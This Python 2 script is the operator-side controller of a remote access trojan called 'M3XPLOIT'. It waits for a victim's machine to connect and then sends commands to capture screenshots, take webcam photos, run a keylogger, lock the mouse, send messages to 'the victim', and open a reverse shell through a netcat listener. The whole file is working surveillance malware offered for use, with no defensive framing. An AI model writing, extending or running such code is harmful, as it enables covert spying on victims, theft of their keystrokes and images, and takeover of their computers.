import socket, sys, threading, os
from datetime import datetime

def user():
    os.system('whoami > /tmp/user')
    file = open('/tmp/user').read()
    if "root" not in file:
        print "Run as root"
        exit(0)
user()

def main(main_sock):
    global sock
    sock = main_sock
    
    print "M3XPLOIT, Type [?] or [help] to see more options\n"
    try:
        while True:
            try:
                pack = str(raw_input("M3XPLOIT > "))
            except:
                print "\nKeyboard interruption"
                exit(0)
            if pack == "?" or pack == "help":
                cmd_win = "type\t== cat\ndir\t== ls\ncd\t== cd\nwhoami\t== whoami"
                print '\n-----------| M3XPLOIT OPTIONS |---------------\n\nscreenshot		Take a screenshot\nwebcam_shot		Take a webcam shot\nsend_msg\t\tSend msg for the victm\nkeylogger		Init a keylogger\nshell			Get a reverse shell\nmouse_lock		Lock the pointer\nmouse_unlock		Unlock the pointer\nexit,quit		Exit from M3XPLOIT\n\n----------------------------------------------\n\n--------------------------------------\n| Windows commands equivalent to GNU |\n--------------------------------------\n      | Windows |==|  GNU    |\n      ------------------------\n      | type    |==|  cat    |\n      | echo    |==|  echo   |\n      | dir     |==|  ls     |\n      | del     |==|  rm     |\n      | cd      |==|  cd     |\n      | move    |==|  mv     |\n      | whoami  |==|  whoami |\n      -----------------------'


            elif pack == "quit" or pack == 'exit':
                sock.send("exit")
                sock.close()
                exit(0)

            elif pack == 'webcam_shot':
                sock.send('webcam')
                webcam()
                
            elif pack == 'screenshot':
                sock.send('screenshot')
                screenshot()
                
            elif pack == "keylogger":
                sock.send("keylogger")
                keylogger()

            elif pack == 'shell':
                sock.send('shell')
                sock.send(str(port2))
                os.system('nc -lvp '+str(port2))

            elif pack == "send_msg":
                sock.send('imahacker')
                sendmsg()

            elif pack == "mouse_lock":
                sock.send('mouse_lock')
                print sock.recv(50)
                
            elif pack == "mouse_unlock":
                sock.send('mouse_unlock')
                print sock.recv(50)
            else:
                print "Unkown command ["+str(pack)+"]"
    except Exception as erro:
        print "\n[!] Keyboard interruption"
        sock.close()
        exit(0)


def sendmsg():
    print "Write your menssage | Send with [ENTER] | MAX DATA 4024 BITES"
    data = raw_input('MSG: ')
    file = open('/tmp/.mensage', 'w')
    file.write(data)
    file.close

    sock.send(data)
def webcam():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".jpg"
    print "Taking a photo...."
    file = open("Photo"+id, 'w')
    sock.settimeout(5)
    try:
        while True:
            image = sock.recv(9000)
            if "ERROR" in image:
                print sock.recv(1024)
                pass
            file.write(image)
    except Exception as erro:
        file.close()
        print 'Saved in Photo'+id
        
def screenshot():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".jpg"
    print "Taking a screenshot...."
    file = open("Screenshot"+id, 'w')
    sock.settimeout(5)
    try:
        while True:
            image = sock.recv(9000)
            if "ERROR" in image:
                print sock.recv(1024)
                pass
            file.write(image)
    except:
        file.close()
        print 'Saved in Screenshot'+id
    
def keylogger():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".txt"
    file = open("logs-"+id, 'w')

    try:
        while True:
            key = sock.recv(10)
            file.write(key)
            print key
    except:
        print "Saved as",id
        file.close()


def connect(porta, ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((ip, int(porta)))
    print "Listening on",str(ip)+":"+str(porta)
    sock.listen(1)

    global send_msg
    send_msg, address = sock.accept()
    print "Connected with", address[0]
    main(send_msg)
def init():
    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        global port2
        port2 = int(sys.argv[3])
    except:
        print "Use:",sys.argv[0],'BIND IP', "<PORT1> <PORT2>\nExemple: python",sys.argv[0],"0.0.0.0","443 8080\n\n"
        exit(0)
        
    connect(port, ip)

init()
